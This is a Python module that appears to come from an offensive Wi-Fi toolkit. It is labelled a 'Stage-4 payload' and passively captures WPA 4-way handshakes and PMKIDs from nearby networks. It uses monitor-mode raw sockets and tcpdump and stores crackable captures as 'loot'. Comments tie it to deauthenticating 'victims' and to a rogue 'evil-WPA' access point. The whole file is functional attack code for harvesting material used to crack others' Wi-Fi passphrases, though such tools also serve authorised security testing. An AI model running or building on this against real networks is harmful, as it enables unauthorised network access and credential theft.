"""Stage-4 payload: passive WPA handshake / PMKID capture.

Watches the monitor interface on the target channel and picks 802.11 EAPOL
key frames out of the air. When a full 4-way exchange (Msg1 from the AP plus
Msg2 from a client) or a PMKID element is seen, the sighting is indexed into
the loot (handshakes.json) and the raw 802.1X traffic is recorded to
loot/pcaps/ with tcpdump when the binary is present. Nothing is exfiltrated —
everything stays on-device in the loot tree.

Detection is honest: we report what we actually saw (Msg1+Msg2, PMKID).
"""

import os
import socket
import struct
import threading
import time

from . import config
from . import linuxutil
from . import state

RSN_PMKID = bytes.fromhex('000fac04')


def unique_pcap_path():
    """Fresh loot/pcaps path that never collides within the same second.

    A quick disarm/re-arm in the same second used to reuse one filename and
    tcpdump would silently overwrite the previous (possibly crackable) capture.
    """
    try:
        os.makedirs(config.PCAP_DIR, exist_ok=True)
    except OSError:
        pass
    base = 'malstrom-%s' % time.strftime('%Y%m%d-%H%M%S')
    n = 0
    while True:
        name = '%s.pcap' % base if not n else '%s-%d.pcap' % (base, n)
        path = os.path.join(config.PCAP_DIR, name)
        if not os.path.exists(path):
            return path
        n += 1


class CaptureEngine(object):
    def __init__(self):
        self._stop = threading.Event()
        self._thread = None
        self._lock = threading.Lock()
        self._cmd = {'active': False, 'bssid': '', 'ssid': '',
                     'channel': None, 'mode': 'off', 'rogue_bssid': ''}
        self._pairs = {}
        self._indexed = set()
        self._pcap = None
        self._pcap_file = None
        self._mon = None
        self._no_mon_warned = False
        self._verify = None
        self._last_chan = {}

    def set_verifier(self, verify):
        """Hook the post-capture validity verifier (verify.VerifyEngine)."""
        self._verify = verify

    def _monitor(self):
        """Resolve monitor vif, caching only a usable result (see deauth)."""
        if self._mon:
            return self._mon
        mon = linuxutil.ensure_monitor_iface()
        if mon:
            self._mon = mon
        return mon

    def set_cmd(self, **kw):
        with self._lock:
            self._cmd.update(kw)

    def current_cmd(self):
        with self._lock:
            return dict(self._cmd)

    # --- lifecycle ---------------------------------------------------------
    def start(self):
        self._stop.clear()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)
            self._thread = None
        self._close_pcap()
        self._pairs.clear()
        self._indexed.clear()

    # --- sniffing loop ------------------------------------------------------
    def _run(self):
        while not self._stop.is_set():
            try:
                self._cycle()
            except Exception as exc:
                state.emit('ALERT', 'capture engine: %s' % exc)
            self._stop.wait(1.0)

    def _capturing(self):
        cmd = self.current_cmd()
        return bool(cmd['active'] and cmd['mode'] in
                    ('handshake', 'pmkid', 'both'))

    def _set_mon_channel(self, mon, channel):
        """Tune the monitor vif, skipping redundant calls (see deauth).

        Repeated `iw dev X set channel` on cheap USB dongles stalls the driver
        for hundreds of ms each — the same path that wedged the radio stack
        mid-attack. Only toggle the channel when it actually moved.
        """
        channel = str(channel)
        if self._last_chan.get(mon) == channel:
            return False
        if linuxutil.set_channel(mon, channel):
            self._last_chan[mon] = channel
        return True

    def _cycle(self):
        if not self._capturing():
            self._close_pcap()
            self._stop.wait(2.0)
            return

        mon = self._monitor()
        if not mon:
            if not self._no_mon_warned:
                state.emit('ALERT', 'capture: no monitor interface available')
                self._no_mon_warned = True
            return
        ch = self.current_cmd().get('channel')
        if ch:
            self._set_mon_channel(mon, ch)

        sock = None
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                 socket.htons(0x0003))
            sock.bind((mon, 0))
            sock.settimeout(1)
        except OSError:
            if not self._no_mon_warned:
                state.emit('ALERT', 'capture: cannot bind %s' % mon)
                self._no_mon_warned = True
            return

        self._open_pcap(mon)
        last_tune = 0.0
        while not self._stop.is_set() and self._capturing():
            # re-tune at most once per second so an operator channel change is
            # honored without the set_channel storm that wedges USB radios
            now = time.time()
            if now - last_tune >= 1.0:
                ch = self.current_cmd().get('channel')
                if ch:
                    self._set_mon_channel(mon, ch)
                last_tune = now
            try:
                data = sock.recv(65535)
            except socket.timeout:
                continue
            except OSError:
                break
            self._ingest(data)
        sock.close()

    # --- pcap recording ------------------------------------------------------
    def _open_pcap(self, mon):
        if self._pcap:
            return
        if not linuxutil.have('tcpdump'):
            return
        try:
            os.makedirs(config.PCAP_DIR, exist_ok=True)
        except OSError:
            pass
        path = unique_pcap_path()
        try:
            self._pcap = linuxutil.run_bg(['tcpdump', '-i', mon, '-U', '-s', '0',
                                           '-w', path, 'ether', 'proto', '0x888e'])
            self._pcap_file = path
            state.emit('INFO', 'payload capture: writing %s' % path)
        except OSError:
            self._pcap = None

    def _close_pcap(self):
        with self._lock:
            if self._pcap:
                try:
                    self._pcap.terminate()
                    self._pcap.wait(timeout=2)
                except Exception:
                    try:
                        self._pcap.kill()
                    except Exception:
                        pass
                self._pcap = None
            if self._pcap_file:
                closed = self._pcap_file
                self._pcap_file = None
                state.emit('INFO', 'payload capture closed: %s' % closed)
                if self._verify:
                    self._verify.enqueue(closed)

    # --- EAPOL parsing -------------------------------------------------------
    def _parse_eapol(self, data, hdr_end):
        """Return (msg_type, key_data) from a data frame body, or None.

        EAPOL rides LLC/SNAP + ethertype 0x888e after the 802.11 header, so a
        real frame looks like: [.. 802.11 ..] [aa aa 03 00 00 00] [88 8e]
        [ver type length] [EAPOL-Key ...]. The ethertype is what `find` locates;
        everything after it is the 802.1X envelope.
        """
        idx = data.find(b'\x88\x8e', hdr_end)
        if idx < hdr_end:
            return None
        try:
            if data[idx + 3] != 3:          # 802.1X type 3 == EAPOL-Key
                return None
            if data[idx + 6] not in (1, 2):  # 1 == WPA, 2 == RSN
                return None
            key_info = struct.unpack('<H', data[idx + 7:idx + 9])[0]
            ack = bool(key_info & 0x0080)
            mic = bool(key_info & 0x0100)
            if ack and not mic:
                mtype = 1
            elif mic and not ack:
                mtype = 2
            elif ack and mic:
                mtype = 3
            else:
                mtype = 4
            klen = struct.unpack('<H', data[idx + 99:idx + 101])[0]
            kdata = data[idx + 101:idx + 101 + klen]
            return mtype, kdata
        except (struct.error, IndexError, ValueError):
            return None

    def _ingest(self, data):
        if len(data) < 20:
            return
        try:
            rt_len = struct.unpack('<H', data[2:4])[0]
        except struct.error:
            return
        if rt_len < 4 or rt_len > len(data) - 10:
            return
        w = data[rt_len:]
        if len(w) < 26:
            return
        fc = struct.unpack('<H', w[0:2])[0]
        if ((fc >> 2) & 3) != 2:          # data frame only (EAPOL rides data)
            return
        addr1 = w[4:10]
        addr2 = w[10:16]
        hdr = 24
        subtype = (fc >> 4) & 0x0F
        if subtype in (8, 9, 10, 11, 12, 13, 14, 15):
            hdr += 2                       # QoS control field
        parsed = self._parse_eapol(data, rt_len + hdr)
        if not parsed:
            return
        mtype, kdata = parsed
        addr1 = ':'.join('%02x' % b for b in addr1).upper()
        addr2 = ':'.join('%02x' % b for b in addr2).upper()
        # BSSID attribution: Msg1/3 are transmitted by the AP (addr2 = AP),
        # Msg2/4 are sent by the client to the AP (addr1 = AP).
        if mtype in (1, 3):
            ap, sta = addr2, addr1
        else:
            ap, sta = addr1, addr2
        cmd = self.current_cmd()
        tbssid = (cmd.get('bssid') or '').upper()
        rogue = (cmd.get('rogue_bssid') or '').upper()

        if rogue and (ap == rogue or sta == rogue):
            # EAPOL with our own evil-WPA AP (either direction) — PSK known.
            return
        if tbssid and tbssid not in (ap, sta):
            return

        key = tuple(sorted((ap, sta)))
        if key not in self._pairs:
            self._pairs[key] = {'msg': set(), 'pmkid': False}
            if len(self._pairs) > 128:     # bound the window
                self._pairs.pop(next(iter(self._pairs)))
        ps = self._pairs[key]
        ps['msg'].add(mtype)
        if mtype in (1, 3) and RSN_PMKID in kdata:
            ps['pmkid'] = True

        if key in self._indexed:
            return
        hs = (1 in ps['msg']) and (2 in ps['msg'])
        pm = ps['pmkid']
        if not (hs or pm):
            return
        self._indexed.add(key)
        if len(self._indexed) > 256:
            self._indexed = set(list(self._indexed)[-128:])
        kind = 'both' if (hs and pm) else ('handshake' if hs else 'pmkid')
        state.index_handshake({
            'ts': time.strftime('%Y-%m-%d %H:%M:%S UTC'),
            'bssid': ap,
            'ssid': cmd.get('ssid', ''),
            'client': sta,
            'kind': kind,
            'file': self._pcap_file or '',
        })
        state.upsert_device(sta)
        self._auto_shield_sta(sta, kind)
        state.mirror_loot()
        state.emit('HANDSHAKE' if kind != 'pmkid' else 'PMKID',
                   '%s for %s (%s) — %s' % (
                       kind.capitalize(), ap, cmd.get('ssid', '?'),
                       self._pcap_file or 'no pcap (tcpdump missing)'))

    def _auto_shield_sta(self, sta, kind):
        """Stop deauthing a client the moment its handshake is in the vault.

        A MAC shield (unlike the captured-client IP shields) survives
        re-arming, so a victim whose capture already landed is never hammered
        again on a fresh engagement. Honors the shield-after-capture toggle;
        failures never break the capture path.
        """
        if not sta:
            return
        try:
            if not state.load_state().get('shield_after_capture'):
                return
            if sta.upper() in {e.upper() for e in state.read_whitelist()}:
                return
            state.add_whitelist(sta)
        except Exception:
            return
        state.emit('INFO', 'auto-shielded %s — %s captured, deauth stops '
                           'for this client' % (sta, kind))